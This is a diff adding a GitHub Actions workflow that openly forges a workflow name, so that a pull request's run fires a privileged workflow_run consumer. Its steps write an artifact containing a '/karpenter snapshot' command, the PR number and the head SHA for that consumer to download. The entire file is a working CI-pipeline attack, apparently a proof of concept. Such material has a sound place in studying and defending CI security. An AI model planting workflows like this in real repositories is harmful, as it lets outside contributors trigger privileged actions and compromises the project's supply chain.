@@ -1,0 +1,24 @@
+name: ApprovalComment
+# Forged: a PR can add a workflow with the same *name* as the workflow the
+# privileged workflow_run consumer watches for. Its pull_request run happens in
+# the base repo and its success fires the workflow_run-triggered consumer.
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft artifact that the privileged workflow_run consumer downloads
+        run: |
+          mkdir -p /tmp/artifacts
+          {
+            echo "/karpenter snapshot"
+            echo "${{ github.event.pull_request.number }}"
+            echo "${{ github.event.pull_request.head.sha }}"
+          } > /tmp/artifacts/metadata.txt
+          cat /tmp/artifacts/metadata.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: artifacts
+          path: /tmp/artifacts
